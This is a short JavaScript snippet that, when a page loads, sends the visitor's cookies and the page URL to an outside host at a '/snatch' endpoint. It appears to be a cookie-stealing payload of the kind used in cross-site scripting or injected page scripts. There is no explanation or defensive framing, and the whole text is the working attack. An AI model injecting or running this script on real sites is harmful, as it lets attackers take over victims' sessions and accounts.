window.onload = function () {
    fetch('https://flux-snack-snatcher.azurewebsites.net/snatch?snacks=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(document.URL));
}